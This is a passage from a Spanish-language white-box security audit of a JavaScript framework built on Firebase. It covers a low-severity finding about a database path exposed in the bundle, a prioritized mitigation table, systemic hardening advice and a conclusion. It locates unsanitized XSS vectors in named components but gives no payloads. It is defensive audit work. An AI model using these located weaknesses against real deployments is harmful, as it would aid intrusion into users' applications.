  return Object.entries(params)
    .map(([key, value]) => `${encodeURIComponent(key)}=${encodeURIComponent(value)}`)
    .join("&");
};
```

---

### 🔵 BAJA — NEW-11: `bap.config.json` accesible y versionado con datos de configuración sensibles

**Archivo:** `bap.config.json`

**Descripción:**
El archivo `bap.config.json` contiene la configuración completa del framework, incluyendo rutas de la Realtime Database (`/allowed_users`), rutas de páginas, eventos de analytics, y parámetros de seguridad. Este archivo está versionado en Git y es leído durante el build por `gulp-imports.js`, siendo su contenido inyectado directamente en el bundle JavaScript:

```json
"realtimeDatabaseRoutes": {
  "usersWhitelist": "/allowed_users"  // ← Ruta de RTDB expuesta en bundle público
}
```

La ruta `/allowed_users` del RTDB queda visible en el bundle compilado (aunque ofuscada), y un atacante que desofusque el código puede identificar exactamente qué nodo del RTDB contiene la whitelist de usuarios autorizados, orientando ataques directos a esa ruta.

**Impacto:**
- Divulgación de la arquitectura interna del RTDB (rutas de datos sensibles).
- Facilita la orientación de ataques de enumeración o fuerza bruta sobre las Reglas de Seguridad de Firebase.

**Recomendación:**

1. **Usar nombres de rutas no descriptivos** para datos sensibles en RTDB:
```json
"realtimeDatabaseRoutes": {
  "usersWhitelist": "/au"  // En lugar de "/allowed_users"
}
```

2. **Documentar** en el README que las rutas de RTDB son visibles en el bundle del cliente y no deben ser consideradas secretas (la seguridad real recae en las Reglas de Seguridad de Firebase, no en la ocultación de rutas).

3. **Auditar las Reglas de Seguridad de Firebase RTDB** para asegurar que el nodo `/allowed_users` solo sea legible por usuarios autenticados y administradores (ver recomendación adicional en plan de mitigación).

---

## Plan de Mitigación Priorizado

| Prioridad | ID | Acción | Esfuerzo estimado | Área afectada |
|-----------|-----|--------|-------------------|---------------|
| 🔴 1 | NEW-01 | Sanitizar `element.innerHTML` en `bap-notification` antes de inyectar en Shadow DOM | 2 horas | `bap-notification.js` |
| 🟠 2 | REG-01 | Ampliar `sanitizeHTML()` para cubrir SVG, data URIs y meta redirection | 4 horas | `i18n.js` |
| 🟠 3 | NEW-02 | Sanitizar contenido SVG en `bap-svg-image` antes de inyección en `innerHTML` | 1 hora | `bap-svg-image.js` |
| 🟠 4 | NEW-03 | Validar `colorMode` contra whitelist en `bap-header` + escapar valores en `preRender` | 1 hora | `bap-header.js` |
| 🟡 5 | NEW-04 | Validar esquemas de URL en `bap-dialog` antes de construir tags `<img>` | 2 horas | `bap-dialog.js` |
| 🟡 6 | REG-02 | Refactorizar métodos síncronos de storage para lanzar Error si se usa `secretKey` | 3 horas | `storage.js` |
| 🟡 7 | NEW-05 | Implementar rate limiting real en `auth.js` usando `CONSTANT.AUTH.LOGIN_ATTEMPTS` | 3 horas | `auth.js` |
| 🟡 8 | NEW-06 | Agregar manejo de errores, validación de `response.ok` y timeout en `createCustomComponent` | 2 horas | `customComponentsRegistration.js` |
| 🟡 9 | NEW-07 | Eliminar `'unsafe-inline'` del CSP de `style-src` migrando estilos inline a clases CSS | 1 día | `firebase.json`, CSS, componentes |
| 🟡 10 | NEW-08 | Implementar `unsubscribe()` del listener `onAuthStateChanged` en `sessionStartedControl` | 2 horas | `router.js` |
| 🔵 11 | NEW-09 | Reemplazar `navigator.userAgent` por `window.matchMedia()` en `isMobile()` | 30 min | `util.js` |
| 🔵 12 | NEW-10 | Agregar `encodeURIComponent()` en `paramsToQueryParams()` | 15 min | `router.js` |
| 🔵 13 | REG-03 | Documentar comportamiento intencional de `ENV_URL` en runtime | 30 min | `constants.js`, README |
| 🔵 14 | NEW-11 | Documentar que rutas de RTDB son visibles en el bundle; considerar nombres no descriptivos | 30 min | `bap.config.json` |

---

## Recomendaciones Sistémicas

Además de las vulnerabilidades específicas, se identificaron mejoras sistémicas que fortalecerían la postura de seguridad general del framework:

### 1. Adoptar una Política de Content Security Policy basada en Nonces
La CSP actual usa `'unsafe-inline'` para estilos y confía en dominios amplios. Migrar a una CSP con nonces generados por el servidor (posible mediante Firebase Cloud Functions como middleware) eliminaría la necesidad de `'unsafe-inline'` y reduciría drásticamente la superficie de ataque de XSS.

### 2. Auditar Reglas de Seguridad de Firebase RTDB
Las Reglas de Seguridad de RTDB no fueron parte de este análisis (están en la consola de Firebase, no en el repositorio). Se recomienda:
- Que el nodo `/allowed_users` sea de **lectura** solo para usuarios autenticados (para la whitelist).
- Que **ningún nodo** sea de escritura pública.
- Exportar y versionar las reglas en el repositorio (`database.rules.json`) para auditabilidad.

### 3. Implementar Subresource Integrity (SRI) para Firebase SDK
Las importaciones desde `https://www.gstatic.com/firebasejs/10.11.0/` no incluyen hashes SRI. Aunque Google controla ese CDN, un compromiso del CDN o un ataque de supply chain afectaría directamente al framework:
```javascript
// Con SRI (requiere calcular el hash de cada módulo):
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.11.0/firebase-app.js"
// → Con bundler: importar desde npm y empaquetar localmente
```

### 4. Establecer un Pipeline CI/CD con Análisis Estático Automático
Implementar GitHub Actions con análisis de seguridad en cada PR:
```yaml
# .github/workflows/security.yml
- name: Run security audit
  run: npm audit --audit-level=high
- name: ESLint security plugin
  run: npx eslint --plugin security src/
```

### 5. Documentar el Modelo de Amenazas del Framework
El framework asume ciertos límites de confianza que no están documentados explícitamente:
- ¿Qué tan confiable es el contenido del diccionario i18n?
- ¿Pueden los datos de Firebase RTDB contener HTML arbitrario?
- ¿Quién puede establecer atributos en los Web Components?

Documentar estas suposiciones en un `SECURITY.md` ayudaría a los consumidores del framework a tomar decisiones de seguridad informadas.

---

## Conclusión

BaP Framework `v2.3.7` demuestra una evolución de seguridad significativa respecto a `v2.0.1`. Las 15 vulnerabilidades del audit anterior fueron abordadas y 12 de ellas fueron corregidas de forma efectiva. El framework implementa correctamente varios patrones de seguridad avanzados: inyección de credenciales en build-time, AES-GCM con PBKDF2, URLSearchParams en el router, CSP configurada, y validación de bypass en el pipeline de Gulp.

Sin embargo, el análisis identifica un patrón recurrente: **la sanitización HTML es incompleta y heterogénea**. Diferentes componentes aplican (o no aplican) sanitización de formas distintas, y la función central `sanitizeHTML()` tiene brechas documentadas. La adopción de DOMPurify como dependencia de seguridad (o una implementación interna más exhaustiva) resolvería de forma unificada la mayoría de los hallazgos de esta auditoría.

El hallazgo más urgente (NEW-01) implica que el componente `bap-notification` no sanitiza su contenido antes de inyectarlo en el Shadow DOM, lo que constituye un vector XSS activo independiente de cómo se instancie el componente.

Con las correcciones propuestas, especialmente las de prioridad 1–4, el framework alcanzará un nivel de seguridad robusto y apropiado para proyectos en producción.

---

*Informe generado mediante análisis estático de código fuente (white-box). No se realizaron pruebas de penetración dinámicas (DAST). Se recomienda complementar este análisis con un audit de las Reglas de Seguridad de Firebase RTDB y un análisis de dependencias npm (`npm audit`).*
